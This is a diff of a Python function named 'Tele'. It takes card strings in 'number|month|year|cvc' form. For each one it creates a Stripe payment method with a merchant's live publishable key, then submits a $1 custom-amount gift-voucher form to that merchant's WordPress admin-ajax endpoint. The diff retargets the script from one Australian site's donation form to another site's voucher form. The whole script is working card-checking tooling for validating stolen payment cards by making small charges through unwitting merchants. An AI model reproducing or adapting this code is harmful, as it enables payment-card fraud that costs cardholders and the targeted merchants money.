@@ -1,22 +1,20 @@
 import requests
 
 def Tele(ccx):
-    # Process the input
     ccx = ccx.strip()
     n, mm, yy, cvc = ccx.split("|")
-    
-    # Handle the year format
+
+    # Adjust `yy` to ensure it contains only two digits
     if "20" in yy:
         yy = yy.split("20")[1]
 
-    # Create a session
     r = requests.session()
 
-    # Headers for the first request
-    headers_1 = {
+    # Define headers for the first request
+    headers = {
         'authority': 'api.stripe.com',
         'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://js.stripe.com',
         'referer': 'https://js.stripe.com/',
@@ -29,35 +27,38 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     }
 
-    # Data for the first request
-    data_1 = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51DMipVKeLHvIBrT6uZAz9LxYzOMOThN05PGot0yoYRIOZNp15FLoaEoWAMJpapXjk4KRouXSLi0rQFEVB6uT6UqC00j5WzCylK'
+    # Properly format the data string
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9e6dead0-a2ec-4e39-807f-56858c09cdb0563da1&muid=d68d0eaa-827f-48b5-ba43-cc54815313030861ca&sid=a45604a9-5f67-4e6f-a2ac-ded94cec5f3c0833b0&payment_user_agent=stripe.js%2Fb2d52e5892%3B+stripe-js-v3%2Fb2d52e5892%3B+card-element&referrer=https%3A%2F%2Fshirazrepublic.com.au&time_on_page=55119&key=pk_live_51GZU1qGnAAExcB98j2cbyVELdkTEwbwAeNiwWvLeu3xxPAoKESXWlwafutP1k95x47GGShXCzdUWf9nzR9fOtZJi00Fau7cVww'
 
-    # First POST request to Stripe
-    r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers_1, data=data_1)
+    r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    pm = r1.json().get('id')
 
-    # Check if the response contains 'id'
-    if 'id' not in r1.json():
-        return {'error': 'Failed to retrieve payment method ID'}
+    if not pm:
+        return {"error": "Failed to retrieve payment method ID"}
 
-    pm = r1.json()['id']
-
-    # Cookies for the second request
+    # Define cookies, headers, and data for the second request
     cookies = {
-        '_ga_CR8R7FTPV8': 'GS1.1.1729167706.1.0.1729167706.60.0.0',
-        '_ga': 'GA1.1.1407958477.1729167706',
-        '_clck': 'bvy00e%7C2%7Cfq3%7C0%7C1751',
-        '_clsk': '1w9ycaf%7C1729167724263%7C1%7C1%7Ce.clarity.ms%2Fcollect',
-        'cookieconsent_status': 'dismiss',
+        'sbjs_migrations': '1418474375998%3D1',
+        'sbjs_current_add': 'fd%3D2024-11-03%2021%3A11%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fshirazrepublic.com.au%2Fgift-voucher%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+        'sbjs_first_add': 'fd%3D2024-11-03%2021%3A11%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fshirazrepublic.com.au%2Fgift-voucher%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+        '_gcl_au': '1.1.1784850561.1730666486',
+        '_ga': 'GA1.1.1192491123.1730666487',
+        '_ga_Y9FJMYBDWM': 'GS1.1.1730666486.1.1.1730666575.0.0.0',
+        'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshirazrepublic.com.au%2Fgift-voucher%2F',
+        '__stripe_mid': 'd68d0eaa-827f-48b5-ba43-cc54815313030861ca',
+        '__stripe_sid': 'a45604a9-5f67-4e6f-a2ac-ded94cec5f3c0833b0',
     }
 
-    # Headers for the second request
-    headers_2 = {
-        'authority': 'tasmanianinquirer.com.au',
+    headers = {
+        'authority': 'shirazrepublic.com.au',
         'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9',
+        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://tasmanianinquirer.com.au',
-        'referer': 'https://tasmanianinquirer.com.au/contribute/',
+        'origin': 'https://shirazrepublic.com.au',
+        'referer': 'https://shirazrepublic.com.au/gift-voucher/',
         'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -68,26 +69,22 @@ def Tele(ccx):
         'x-requested-with': 'XMLHttpRequest',
     }
 
-    # Parameters for the second request
     params = {
-        't': '1729167784840',
+        't': '1730666657106',
     }
 
-    # Data for the second request
-    data_2 = {
-        'data': '__fluent_form_embded_post_id=3500&_fluentform_3_fluentformnonce=f58e6c4dec&_wp_http_referer=%2Fcontribute%2F&payment_input_1=5&email=waznimey%40gmail.com&names_1%5Bfirst_name%5D=waznim&names_1%5Blast_name%5D=ey%20ey&payment_method=stripe&checkbox%5B%5D=&__stripe_payment_method_id=' + str(pm),
+    data = {
+        'data': f'__fluent_form_embded_post_id=13034&_fluentform_8_fluentformnonce=4d34634a8f&_wp_http_referer=%2Fgift-voucher%2F&names%5Bfirst_name%5D=waznim&names%5Blast_name%5D=ey&email=waznimey%40gmail.com&phone=&voucher_value=Custom%20Amount&custom-payment-amount=1.00&input_text=waznim%20ey%20ey&payment_method=stripe&__stripe_payment_method_id={pm}',
         'action': 'fluentform_submit',
-        'form_id': '3',
+        'form_id': '8',
     }
 
-    # Second POST request to the server
     r2 = r.post(
-        'https://tasmanianinquirer.com.au/wp-admin/admin-ajax.php',
+        'https://shirazrepublic.com.au/wp-admin/admin-ajax.php',
         params=params,
         cookies=cookies,
-        headers=headers_2,
-        data=data_2,
+        headers=headers,
+        data=data,
     )
-
-    # Return the response from the second request
+    
     return r2.json()
